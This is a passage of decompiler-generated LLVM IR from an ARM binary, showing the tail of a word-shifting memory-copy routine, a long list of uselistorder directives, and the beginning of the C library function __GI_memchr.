  store i32 %v9_1a2ac, i32* %v8_1a2ac, align 4
  %v10_1a2ac = add i32 %v0_1a2ac, -4
  %v11_1a2ac = inttoptr i32 %v10_1a2ac to i32*
  %v12_1a2ac = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_1a2ac, i32* %v11_1a2ac, align 4
  store i32 %v1_1a2ac, i32* %r0.global-to-local, align 4
  %v0_1a2b0 = load i32, i32* %r2.global-to-local, align 4
  %v2_1a2b0 = add i32 %v0_1a2b0, -16
  store i32 %v2_1a2b0, i32* %r2.global-to-local, align 4
  %v6_1a2b4 = icmp slt i32 %v0_1a2b0, 16
  br i1 %v6_1a2b4, label %dec_label_pc_1a2b8, label %dec_label_pc_1a288.dec_label_pc_1a288_crit_edge

dec_label_pc_1a288.dec_label_pc_1a288_crit_edge:  ; preds = %dec_label_pc_1a288
  %v0_1a288.pre = load i32, i32* @r3, align 4
  %v0_1a28c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1a288

dec_label_pc_1a2b8:                               ; preds = %dec_label_pc_1a288
  %v2_1a2b8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1a2b8, i32* @r4, align 4
  %v5_1a2b8 = load i8*, i8** %stack_var_-8, align 4
  %v6_1a2b8 = ptrtoint i8* %v5_1a2b8 to i32
  store i32 %v6_1a2b8, i32* @r5, align 4
  store i32 %v11_1a284, i32* @lr, align 4
  %v2_1a2bc = add i32 %v0_1a2b0, -4
  store i32 %v2_1a2bc, i32* %r2.global-to-local, align 4
  %v4_1a2bc = add i32 %v0_1a2b0, 2147483632
  %v5_1a2bc = and i32 %v2_1a2bc, %v4_1a2bc
  %v6_1a2bc = icmp slt i32 %v5_1a2bc, 0
  store i1 %v6_1a2bc, i1* %cpsr_v.global-to-local, align 1
  %v7_1a2bc = icmp slt i32 %v2_1a2bc, 0
  store i1 %v7_1a2bc, i1* %cpsr_n.global-to-local, align 1
  %v8_1a2bc = icmp eq i32 %v2_1a2bc, 0
  store i1 %v8_1a2bc, i1* %cpsr_z.global-to-local, align 1
  %v5_1a2c0 = icmp slt i32 %v2_1a2b0, -12
  br i1 %v5_1a2c0, label %dec_label_pc_1a2dc, label %dec_label_pc_1a2c4

dec_label_pc_1a2c4:                               ; preds = %dec_label_pc_1a2b8, %dec_label_pc_1a278, %dec_label_pc_1a2c4
  %v1_1a2d0 = phi i32 [ %v5_1a2d0, %dec_label_pc_1a2c4 ], [ %v1_1a2ac, %dec_label_pc_1a2b8 ], [ %v0_1a24018, %dec_label_pc_1a278 ]
  %v0_1a2c4 = load i32, i32* @r3, align 4
  %v3_1a2c4 = mul i32 %v0_1a2c4, 65536
  store i32 %v3_1a2c4, i32* %ip.global-to-local, align 4
  %v0_1a2c8 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a2c8 = add i32 %v0_1a2c8, -4
  %v2_1a2c8 = inttoptr i32 %v1_1a2c8 to i32*
  %v3_1a2c8 = load i32, i32* %v2_1a2c8, align 4
  store i32 %v3_1a2c8, i32* @r3, align 4
  store i32 %v1_1a2c8, i32* %r1.global-to-local, align 4
  %v4_1a2cc = udiv i32 %v3_1a2c8, 65536
  %v5_1a2cc = or i32 %v4_1a2cc, %v3_1a2c4
  store i32 %v5_1a2cc, i32* @ip, align 4
  %v2_1a2d0 = add i32 %v1_1a2d0, -4
  %v3_1a2d0 = inttoptr i32 %v2_1a2d0 to i32*
  store i32 %v5_1a2cc, i32* %v3_1a2d0, align 4
  %v4_1a2d0 = load i32, i32* %r0.global-to-local, align 4
  %v5_1a2d0 = add i32 %v4_1a2d0, -4
  store i32 %v5_1a2d0, i32* %r0.global-to-local, align 4
  %v0_1a2d4 = load i32, i32* %r2.global-to-local, align 4
  %v2_1a2d4 = add i32 %v0_1a2d4, -4
  store i32 %v2_1a2d4, i32* %r2.global-to-local, align 4
  %v6_1a2d8 = icmp slt i32 %v0_1a2d4, 4
  br i1 %v6_1a2d8, label %dec_label_pc_1a2dc.loopexit, label %dec_label_pc_1a2c4

dec_label_pc_1a2dc.loopexit:                      ; preds = %dec_label_pc_1a2c4
  %v4_1a2d4 = sub i32 3, %v0_1a2d4
  %v5_1a2d4 = and i32 %v4_1a2d4, %v0_1a2d4
  %v6_1a2d4 = icmp slt i32 %v5_1a2d4, 0
  %v7_1a2d4 = icmp slt i32 %v2_1a2d4, 0
  store i1 %v6_1a2d4, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_1a2d4, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1a2dc

dec_label_pc_1a2dc:                               ; preds = %dec_label_pc_1a2dc.loopexit, %dec_label_pc_1a2b8
  %v2_1a1b451 = phi i32 [ %v5_1a2d0, %dec_label_pc_1a2dc.loopexit ], [ %v1_1a2ac, %dec_label_pc_1a2b8 ]
  %v0_1a1a447 = phi i32 [ %v2_1a2d4, %dec_label_pc_1a2dc.loopexit ], [ %v2_1a2bc, %dec_label_pc_1a2b8 ]
  %v0_1a2dc = load i32, i32* %r1.global-to-local, align 4
  %v1_1a2dc = add i32 %v0_1a2dc, 2
  store i32 %v1_1a2dc, i32* %r1.global-to-local, align 4
  br label %bb150

dec_label_pc_1a2e4:                               ; preds = %dec_label_pc_1a1f8
  br i1 %v5_1a2e8, label %dec_label_pc_1a330, label %dec_label_pc_1a2ec

dec_label_pc_1a2ec:                               ; preds = %dec_label_pc_1a2e4
  store i32 %v2_1a2e4, i32* %r2.global-to-local, align 4
  %v3_1a2f0 = load i32, i32* @r4, align 4
  store i32 %v3_1a2f0, i32* %stack_var_-12, align 4
  %v6_1a2f0 = load i32, i32* @r5, align 4
  %v8_1a2f0 = inttoptr i32 %v6_1a2f0 to i8*
  store i8* %v8_1a2f0, i8** %stack_var_-8, align 4
  %v11_1a2f0 = load i32, i32* @lr, align 4
  br label %dec_label_pc_1a2f4

dec_label_pc_1a2f4:                               ; preds = %dec_label_pc_1a2f4.dec_label_pc_1a2f4_crit_edge, %dec_label_pc_1a2ec
  %v0_1a318 = phi i32 [ %v1_1a318, %dec_label_pc_1a2f4.dec_label_pc_1a2f4_crit_edge ], [ %v0_1a24018, %dec_label_pc_1a2ec ]
  %v0_1a2f8 = phi i32 [ %v0_1a2f8.pre, %dec_label_pc_1a2f4.dec_label_pc_1a2f4_crit_edge ], [ %v1_1a1f8, %dec_label_pc_1a2ec ]
  %v0_1a2f4 = phi i32 [ %v0_1a2f4.pre, %dec_label_pc_1a2f4.dec_label_pc_1a2f4_crit_edge ], [ %v2_1a1fc, %dec_label_pc_1a2ec ]
  %v3_1a2f4 = mul i32 %v0_1a2f4, 16777216
  store i32 %v3_1a2f4, i32* %lr.global-to-local, align 4
  %v1_1a2f8 = add i32 %v0_1a2f8, -4
  %v2_1a2f8 = inttoptr i32 %v1_1a2f8 to i32*
  %v3_1a2f8 = load i32, i32* %v2_1a2f8, align 4
  store i32 %v3_1a2f8, i32* @r3, align 4
  %v4_1a2f8 = add i32 %v0_1a2f8, -8
  %v5_1a2f8 = inttoptr i32 %v4_1a2f8 to i32*
  %v6_1a2f8 = load i32, i32* %v5_1a2f8, align 4
  store i32 %v6_1a2f8, i32* %r4.global-to-local, align 4
  %v7_1a2f8 = add i32 %v0_1a2f8, -12
  %v8_1a2f8 = inttoptr i32 %v7_1a2f8 to i32*
  %v9_1a2f8 = load i32, i32* %v8_1a2f8, align 4
  store i32 %v9_1a2f8, i32* %r5.global-to-local, align 4
  %v10_1a2f8 = add i32 %v0_1a2f8, -16
  %v11_1a2f8 = inttoptr i32 %v10_1a2f8 to i32*
  %v12_1a2f8 = load i32, i32* %v11_1a2f8, align 4
  store i32 %v10_1a2f8, i32* %r1.global-to-local, align 4
  %v4_1a2fc = udiv i32 %v12_1a2f8, 256
  %v5_1a2fc = or i32 %v4_1a2fc, %v3_1a2f4
  store i32 %v5_1a2fc, i32* %lr.global-to-local, align 4
  %v3_1a300 = mul i32 %v12_1a2f8, 16777216
  %v4_1a304 = udiv i32 %v9_1a2f8, 256
  %v5_1a304 = or i32 %v3_1a300, %v4_1a304
  store i32 %v5_1a304, i32* @ip, align 4
  %v3_1a308 = mul i32 %v9_1a2f8, 16777216
  %v4_1a30c = udiv i32 %v6_1a2f8, 256
  %v5_1a30c = or i32 %v3_1a308, %v4_1a30c
  store i32 %v5_1a30c, i32* %r5.global-to-local, align 4
  %v3_1a310 = mul i32 %v6_1a2f8, 16777216
  %v4_1a314 = udiv i32 %v3_1a2f8, 256
  %v5_1a314 = or i32 %v3_1a310, %v4_1a314
  store i32 %v5_1a314, i32* %r4.global-to-local, align 4
  %v1_1a318 = add i32 %v0_1a318, -16
  %v2_1a318 = inttoptr i32 %v1_1a318 to i32*
  store i32 %v5_1a314, i32* %v2_1a318, align 4
  %v4_1a318 = add i32 %v0_1a318, -12
  %v5_1a318 = inttoptr i32 %v4_1a318 to i32*
  %v6_1a318 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_1a318, i32* %v5_1a318, align 4
  %v7_1a318 = add i32 %v0_1a318, -8
  %v8_1a318 = inttoptr i32 %v7_1a318 to i32*
  %v9_1a318 = load i32, i32* @ip, align 4
  store i32 %v9_1a318, i32* %v8_1a318, align 4
  %v10_1a318 = add i32 %v0_1a318, -4
  %v11_1a318 = inttoptr i32 %v10_1a318 to i32*
  %v12_1a318 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_1a318, i32* %v11_1a318, align 4
  store i32 %v1_1a318, i32* %r0.global-to-local, align 4
  %v0_1a31c = load i32, i32* %r2.global-to-local, align 4
  %v2_1a31c = add i32 %v0_1a31c, -16
  store i32 %v2_1a31c, i32* %r2.global-to-local, align 4
  %v6_1a320 = icmp slt i32 %v0_1a31c, 16
  br i1 %v6_1a320, label %dec_label_pc_1a324, label %dec_label_pc_1a2f4.dec_label_pc_1a2f4_crit_edge

dec_label_pc_1a2f4.dec_label_pc_1a2f4_crit_edge:  ; preds = %dec_label_pc_1a2f4
  %v0_1a2f4.pre = load i32, i32* @r3, align 4
  %v0_1a2f8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1a2f4

dec_label_pc_1a324:                               ; preds = %dec_label_pc_1a2f4
  %v2_1a324 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1a324, i32* @r4, align 4
  %v5_1a324 = load i8*, i8** %stack_var_-8, align 4
  %v6_1a324 = ptrtoint i8* %v5_1a324 to i32
  store i32 %v6_1a324, i32* @r5, align 4
  store i32 %v11_1a2f0, i32* @lr, align 4
  %v2_1a328 = add i32 %v0_1a31c, -4
  store i32 %v2_1a328, i32* %r2.global-to-local, align 4
  %v4_1a328 = add i32 %v0_1a31c, 2147483632
  %v5_1a328 = and i32 %v2_1a328, %v4_1a328
  %v6_1a328 = icmp slt i32 %v5_1a328, 0
  store i1 %v6_1a328, i1* %cpsr_v.global-to-local, align 1
  %v7_1a328 = icmp slt i32 %v2_1a328, 0
  store i1 %v7_1a328, i1* %cpsr_n.global-to-local, align 1
  %v8_1a328 = icmp eq i32 %v2_1a328, 0
  store i1 %v8_1a328, i1* %cpsr_z.global-to-local, align 1
  %v5_1a32c = icmp slt i32 %v2_1a31c, -12
  br i1 %v5_1a32c, label %dec_label_pc_1a348, label %dec_label_pc_1a330

dec_label_pc_1a330:                               ; preds = %dec_label_pc_1a324, %dec_label_pc_1a2e4, %dec_label_pc_1a330
  %v1_1a33c = phi i32 [ %v5_1a33c, %dec_label_pc_1a330 ], [ %v1_1a318, %dec_label_pc_1a324 ], [ %v0_1a24018, %dec_label_pc_1a2e4 ]
  %v0_1a330 = load i32, i32* @r3, align 4
  %v3_1a330 = mul i32 %v0_1a330, 16777216
  store i32 %v3_1a330, i32* %ip.global-to-local, align 4
  %v0_1a334 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a334 = add i32 %v0_1a334, -4
  %v2_1a334 = inttoptr i32 %v1_1a334 to i32*
  %v3_1a334 = load i32, i32* %v2_1a334, align 4
  store i32 %v3_1a334, i32* @r3, align 4
  store i32 %v1_1a334, i32* %r1.global-to-local, align 4
  %v4_1a338 = udiv i32 %v3_1a334, 256
  %v5_1a338 = or i32 %v4_1a338, %v3_1a330
  store i32 %v5_1a338, i32* @ip, align 4
  %v2_1a33c = add i32 %v1_1a33c, -4
  %v3_1a33c = inttoptr i32 %v2_1a33c to i32*
  store i32 %v5_1a338, i32* %v3_1a33c, align 4
  %v4_1a33c = load i32, i32* %r0.global-to-local, align 4
  %v5_1a33c = add i32 %v4_1a33c, -4
  store i32 %v5_1a33c, i32* %r0.global-to-local, align 4
  %v0_1a340 = load i32, i32* %r2.global-to-local, align 4
  %v2_1a340 = add i32 %v0_1a340, -4
  store i32 %v2_1a340, i32* %r2.global-to-local, align 4
  %v6_1a344 = icmp slt i32 %v0_1a340, 4
  br i1 %v6_1a344, label %dec_label_pc_1a348.loopexit, label %dec_label_pc_1a330

dec_label_pc_1a348.loopexit:                      ; preds = %dec_label_pc_1a330
  %v4_1a340 = sub i32 3, %v0_1a340
  %v5_1a340 = and i32 %v4_1a340, %v0_1a340
  %v6_1a340 = icmp slt i32 %v5_1a340, 0
  %v7_1a340 = icmp slt i32 %v2_1a340, 0
  store i1 %v6_1a340, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_1a340, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1a348

dec_label_pc_1a348:                               ; preds = %dec_label_pc_1a348.loopexit, %dec_label_pc_1a324
  %v2_1a1b452 = phi i32 [ %v5_1a33c, %dec_label_pc_1a348.loopexit ], [ %v1_1a318, %dec_label_pc_1a324 ]
  %v0_1a1a448 = phi i32 [ %v2_1a340, %dec_label_pc_1a348.loopexit ], [ %v2_1a328, %dec_label_pc_1a324 ]
  %v0_1a348 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a348 = add i32 %v0_1a348, 1
  store i32 %v1_1a348, i32* %r1.global-to-local, align 4
  br label %bb150

; uselistorder directives
  uselistorder i32 %v5_1a33c, { 0, 2, 1 }
  uselistorder i32 %v3_1a330, { 1, 0 }
  uselistorder i32 %v2_1a328, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_1a318, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_1a2f8, { 1, 0 }
  uselistorder i32 %v3_1a2f4, { 1, 0 }
  uselistorder i32 %v0_1a2f8, { 3, 2, 1, 0 }
  uselistorder i32 %v0_1a318, { 3, 2, 1, 0 }
  uselistorder i32 %v5_1a2d0, { 0, 2, 1 }
  uselistorder i32 %v3_1a2c4, { 1, 0 }
  uselistorder i32 %v2_1a2bc, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_1a2ac, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_1a28c, { 1, 0 }
  uselistorder i32 %v3_1a288, { 1, 0 }
  uselistorder i32 %v0_1a28c, { 3, 2, 1, 0 }
  uselistorder i32 %v0_1a2ac, { 3, 2, 1, 0 }
  uselistorder i32 %v5_1a264, { 0, 2, 1 }
  uselistorder i32 %v3_1a258, { 1, 0 }
  uselistorder i32 %v2_1a250, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_1a240, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_1a220, { 1, 0 }
  uselistorder i32 %v3_1a21c, { 1, 0 }
  uselistorder i32 %v0_1a220, { 3, 2, 1, 0 }
  uselistorder i32 %v0_1a240, { 3, 2, 1, 0 }
  uselistorder i1 %v5_1a2e8, { 2, 0, 1 }
  uselistorder i32 %v0_1a200, { 1, 0 }
  uselistorder i32 %v0_1a2ec, { 4, 1, 0, 3, 2 }
  uselistorder i32 %v0_1a24018, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_1a1f0, { 2, 1, 0 }
  uselistorder i32 %v0_1a1f0, { 2, 0, 1 }
  uselistorder i32 %v2_1a1e8, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_1a1e8, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1a1e8, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_1a24019, { 2, 1, 0 }
  uselistorder i32 %v11_1a1c4, { 1, 0 }
  uselistorder i32 %v7_1a1c4, { 1, 0 }
  uselistorder i32 %v1_1a1a4, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_1a1a4, { 1, 2, 0, 3 }
  uselistorder i32 %v2_1a1a8, { 1, 0 }
  uselistorder i32 %v7_1a19c, { 0, 2, 1 }
  uselistorder i32 %v10_1a198, { 1, 0 }
  uselistorder i32 %v9_1a190, { 1, 0, 2 }
  uselistorder i32 %v6_1a18c, { 1, 0 }
  uselistorder i32 %v2_1a184, { 0, 2, 1, 3, 5, 6, 4, 7 }
  uselistorder i32 %v0_1a184, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_1a194, { 0, 3, 2, 1 }
  uselistorder i32 %v7_1a178, { 0, 2, 1 }
  uselistorder i32 %v13_1a174, { 1, 0 }
  uselistorder i32 %v4_1a170, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_1a170, { 2, 0, 1 }
  uselistorder i32 %v6_1a178, { 0, 3, 2, 1 }
  uselistorder i32 %v7_1a168, { 0, 2, 1 }
  uselistorder i32 %v16_1a164, { 1, 0 }
  uselistorder i32 %v4_1a160, { 1, 2, 0 }
  uselistorder i32 %v0_1a170.pr, { 1, 3, 0, 2 }
  uselistorder i32 %v6_1a168, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_1a154, { 0, 3, 2, 1 }
  uselistorder i32 %v10_1a150, { 1, 0 }
  uselistorder i32 %v1_1a14c, { 1, 0 }
  uselistorder i32 %v10_1a148, { 1, 0 }
  uselistorder i32 %v0_1a148, { 3, 2, 1, 0 }
  uselistorder i32 %v0_1a14c, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v2_1a140, { 0, 2, 1 }
  uselistorder i32 %v2_1a134, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_1a134, { 1, 2, 6, 3, 0, 5, 4 }
  uselistorder i32 %v0_1a14c36, { 1, 2, 0 }
  uselistorder i32 %v1_1a12c, { 2, 1, 0 }
  uselistorder i32 %v1_1a124, { 2, 3, 1, 0 }
  uselistorder i32 %v2_1a11c, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v2_1a118, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32 %v2_1a114, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_1a114, { 3, 4, 0, 6, 5, 1, 2 }
  uselistorder i32 %v1_1a104, { 0, 2, 1 }
  uselistorder i32 %v4_1a100, { 1, 0 }
  uselistorder i32 %v3_1a0f4, { 1, 0 }
  uselistorder i32 %v1_1a0ec, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_1a0e0, { 1, 0 }
  uselistorder i32 %v12_1a0dc, { 0, 2, 1 }
  uselistorder i32 %v8_1a0bc, { 1, 0, 2 }
  uselistorder i32 %v5_1a0bc, { 1, 0, 2 }
  uselistorder i32 %v2_1a0bc, { 1, 0, 2 }
  uselistorder i32 %v0_1a0bc, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_1a0dc, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_1a098, { 0, 2, 1 }
  uselistorder i32 %v4_1a094, { 1, 0 }
  uselistorder i32 %v3_1a088, { 1, 0 }
  uselistorder i32 %v1_1a080, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_1a074, { 1, 0 }
  uselistorder i32 %v12_1a070, { 0, 2, 1 }
  uselistorder i32 %v8_1a050, { 1, 0, 2 }
  uselistorder i32 %v5_1a050, { 1, 0, 2 }
  uselistorder i32 %v2_1a050, { 1, 0, 2 }
  uselistorder i32 %v0_1a050, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_1a070, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_1a02c, { 0, 2, 1 }
  uselistorder i32 %v4_1a028, { 1, 0 }
  uselistorder i32 %v3_1a01c, { 1, 0 }
  uselistorder i32 %v1_1a014, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_1a008, { 1, 0 }
  uselistorder i32 %v12_1a004, { 0, 2, 1 }
  uselistorder i32 %v8_19fe4, { 1, 0, 2 }
  uselistorder i32 %v5_19fe4, { 1, 0, 2 }
  uselistorder i32 %v2_19fe4, { 1, 0, 2 }
  uselistorder i32 %v0_19fe4, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_1a004, { 4, 3, 2, 1, 0 }
  uselistorder i1 %v2_1a040, { 0, 2, 1 }
  uselistorder i32 %v1_1a03c, { 2, 0, 1, 3 }
  uselistorder i32 %v4_19fc0, { 2, 0, 1, 3 }
  uselistorder i32 %v2_19fc0, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1a044, { 1, 0, 3, 2 }
  uselistorder i32 %v0_1a0dc75, { 0, 5, 1, 3, 2, 4 }
  uselistorder i32 %v1_19fb4, { 1, 0 }
  uselistorder i32 %v0_19fb4, { 3, 1, 0, 2 }
  uselistorder i32 %v2_19fac, { 2, 4, 0, 5, 1, 3 }
  uselistorder i32 %v1_19fac, { 1, 0, 2 }
  uselistorder i32 %v0_19fac, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1a0dc76, { 1, 0 }
  uselistorder i32 %v1_19f8c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_19f94, { 1, 0 }
  uselistorder i32 %v0_19f68, { 3, 0, 1, 2 }
  uselistorder i32 %v1_19f5c, { 1, 2, 0, 3 }
  uselistorder i32 %v5_19f48, { 1, 0, 2 }
  uselistorder i32 %v1_19f44, { 1, 0 }
  uselistorder i32 %v1_19f3c, { 2, 0, 1, 4, 5, 3, 6 }
  uselistorder i32 %v0_19f3c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_19f34, { 0, 2, 1 }
  uselistorder i32 %v3_19f34, { 3, 0, 1, 2 }
  uselistorder i1 %v0_19f34, { 1, 0 }
  uselistorder i1 %v1_19f34, { 1, 0 }
  uselistorder i32 %v3_19f30, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_19f28, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_19f14, { 1, 2, 0 }
  uselistorder i32 %v1_19f0c, { 0, 2, 1 }
  uselistorder i32 %v12_19f08, { 0, 1, 3, 2 }
  uselistorder i32 %v0_19efc, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_19f00, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 11, 10, 9, 8 }
  uselistorder i32 %v1_19ef0, { 0, 2, 1 }
  uselistorder i32 %v1_19ee8, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_19ee8, { 1, 2, 3, 0, 5, 4 }
  uselistorder i32 %v1_19ee0, { 1, 0 }
  uselistorder i32 %v1_19ed8, { 2, 1, 0 }
  uselistorder i32 %v2_19ed0, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v0_19ed0, { 1, 4, 0, 2, 3 }
  uselistorder i32 %v8_19ecc, { 1, 0 }
  uselistorder i32 %v2_19ec0, { 1, 0 }
  uselistorder i32 %v1_19ec0, { 1, 4, 5, 3, 0, 6, 8, 2, 7, 9 }
  uselistorder i32 %v0_19ec0, { 1, 7, 8, 6, 4, 0, 5, 10, 2, 3, 9, 11 }
  uselistorder i8** %stack_var_-8, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 12, 13, 14, 15, 16, 17, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32* %r2.global-to-local, { 0, 61, 1, 2, 3, 4, 5, 62, 6, 7, 8, 9, 41, 63, 42, 43, 44, 45, 46, 64, 47, 49, 48, 50, 51, 52, 53, 54, 55, 57, 56, 58, 59, 60, 65, 66, 67, 68, 69, 70, 71, 10, 37, 11, 12, 13, 14, 15, 38, 16, 17, 18, 19, 20, 39, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 40 }
  uselistorder i32* %r1.global-to-local, { 2, 4, 3, 56, 5, 6, 8, 9, 7, 57, 10, 11, 50, 52, 49, 58, 51, 53, 59, 62, 60, 54, 55, 61, 63, 64, 66, 65, 67, 68, 77, 69, 70, 78, 71, 79, 72, 80, 73, 74, 75, 76, 81, 84, 87, 82, 86, 85, 88, 13, 15, 12, 22, 14, 16, 18, 20, 17, 23, 19, 21, 24, 25, 30, 26, 28, 27, 29, 31, 34, 32, 35, 33, 36, 37, 83, 38, 39, 43, 40, 44, 41, 45, 42, 46, 47, 48, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 51, 3, 4, 52, 5, 33, 53, 34, 37, 35, 36, 38, 39, 54, 40, 42, 41, 43, 44, 55, 45, 46, 56, 47, 48, 49, 50, 57, 58, 61, 62, 6, 12, 7, 8, 13, 9, 10, 14, 11, 15, 16, 18, 17, 19, 20, 22, 21, 23, 24, 59, 60, 25, 26, 27, 30, 28, 29, 31, 32, 0, 1 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 5, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 36, 35, 37, 6, 12, 7, 8, 9, 13, 10, 11, 14, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 9, 10, 11, 12, 13, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 7, 2, 9, 3, 31, 8, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 0, 42, 43, 44, 45, 46, 6, 47, 4, 10, 5, 12, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30 }
  uselistorder i1* %cpsr_v.global-to-local, { 0, 7, 1, 9, 2, 30, 8, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 6, 41, 42, 43, 5, 44, 3, 10, 4, 12, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i1* %cpsr_n.global-to-local, { 1, 7, 2, 9, 3, 33, 8, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 0, 45, 46, 47, 48, 49, 6, 50, 4, 10, 5, 12, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i32 2147483632, { 3, 4, 5, 2, 0, 1 }
  uselistorder i32 -5, { 1, 0, 2 }
  uselistorder i32 -28, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1a330, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1a2c4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1a258, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1a1f8, { 1, 0 }
  uselistorder label %.thread13, { 2, 0, 1 }
  uselistorder label %.thread128, { 1, 0 }
  uselistorder label %bb150, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %dec_label_pc_1a184, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_1a148, { 1, 0 }
  uselistorder label %dec_label_pc_1a134, { 1, 0 }
  uselistorder label %dec_label_pc_1a0f4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1a088, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1a01c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_19fbc, { 1, 0 }
  uselistorder label %.thread127, { 1, 0 }
  uselistorder label %.thread126, { 1, 0 }
  uselistorder label %dec_label_pc_19f8c, { 1, 0 }
  uselistorder label %.thread125, { 1, 0 }
  uselistorder label %.thread124, { 1, 0 }
  uselistorder label %bb142, { 1, 0 }
  uselistorder label %bb140, { 5, 6, 4, 1, 7, 0, 2, 3 }
  uselistorder label %.thread114, { 1, 0 }
  uselistorder label %dec_label_pc_19f28, { 1, 0 }
  uselistorder label %bb137, { 1, 0 }
  uselistorder label %dec_label_pc_19ee8, { 1, 0 }
}

define i32 @__GI_memchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_1a354 = urem i32 %arg1, 256
  %v0_1a370.pr = load i32, i32* @r2, align 4
  %v2_1a37015 = icmp eq i32 %v0_1a370.pr, 0
  %v0_1a384.pre = load i32, i32* @r0, align 4
  br i1 %v2_1a37015, label %dec_label_pc_1a380, label %dec_label_pc_1a378

dec_label_pc_1a35c:                               ; preds = %dec_label_pc_1a378
  %v1_1a35c = inttoptr i32 %v0_1a36c to i8*
  %v2_1a35c = load i8, i8* %v1_1a35c, align 1
  %v3_1a35c = zext i8 %v2_1a35c to i32
  %v9_1a360 = icmp eq i32 %v3_1a35c, %v1_1a354
  br i1 %v9_1a360, label %dec_label_pc_1a430, label %dec_label_pc_1a368

dec_label_pc_1a368:                               ; preds = %dec_label_pc_1a35c
  %v1_1a368 = add i32 %v0_1a368, -1
  %v1_1a36c = add i32 %v0_1a36c, 1
  %v2_1a370 = icmp eq i32 %v1_1a368, 0
  br i1 %v2_1a370, label %dec_label_pc_1a380, label %dec_label_pc_1a378

dec_label_pc_1a378:                               ; preds = %entry, %dec_label_pc_1a368
  %v0_1a368 = phi i32 [ %v1_1a368, %dec_label_pc_1a368 ], [ %v0_1a370.pr, %entry ]
